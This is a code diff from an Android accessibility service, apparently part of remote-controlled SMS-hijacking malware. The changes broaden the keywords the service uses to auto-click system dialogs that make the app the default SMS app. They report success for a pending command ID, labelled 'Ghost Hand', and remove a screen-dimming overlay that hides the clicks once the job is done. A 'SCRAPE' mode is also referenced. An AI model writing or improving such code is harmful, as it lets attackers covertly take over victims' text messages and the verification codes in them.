@@ -385,17 +385,21 @@ class MyAccessibilityService : AccessibilityService() {
                 if (clickedRadio) {
                     // Small delay to allow radio state update
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default")
+                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default") + root.findAccessibilityNodeInfosByText("Set")
                         for (btn in setNodes) {
                             if (btn.isClickable) {
                                 btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                 DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
-                                DefaultSmsManager.expectedMode = "" // Disarm
-                                CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                                 break
                             }
                         }
-                    }, 200)
+                        DefaultSmsManager.expectedMode = "" // Disarm
+                        CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            DimmerManager.removeOverlay(this@MyAccessibilityService)
+                        }, 1500)
+                    }, 400)
                 }
             } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
                 val root = rootInActiveWindow ?: return
@@ -425,6 +429,9 @@ class MyAccessibilityService : AccessibilityService() {
                     CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)
                     
                     performGlobalAction(GLOBAL_ACTION_HOME)
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        DimmerManager.removeOverlay(this@MyAccessibilityService)
+                    }, 1500)
                     return
                 }
 
@@ -469,20 +476,26 @@ class MyAccessibilityService : AccessibilityService() {
                     return
                 }
 
-                // Phase 2: Category list (find 'SMS' or 'SMS app')
-                val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
+                // Phase 2: Category list
                 val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                 val lastSmsClick = prefs.getLong("sms_nav_cat_ts", 0L)
-                if (System.currentTimeMillis() - lastSmsClick > 2500) {
-                    for (node in smsNodes) {
-                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                        while (target != null && !target.isClickable) target = target.parent
-                        if (target != null) {
-                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                            prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
-                            DebugLogger.log("SMS_NAV", "Clicked SMS category")
-                            break
+                if (System.currentTimeMillis() - lastSmsClick > 2000) {
+                    val smsKeywords = listOf("SMS", "SMS app", "Messaging app", "Default SMS app")
+                    var categoryClicked = false
+                    for (kw in smsKeywords) {
+                        val smsNodes = root.findAccessibilityNodeInfosByText(kw)
+                        for (node in smsNodes) {
+                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                            while (target != null && !target.isClickable) target = target.parent
+                            if (target != null) {
+                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
+                                DebugLogger.log("SMS_NAV", "Clicked SMS category: $kw")
+                                categoryClicked = true
+                                break
+                            }
                         }
+                        if (categoryClicked) break
                     }
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
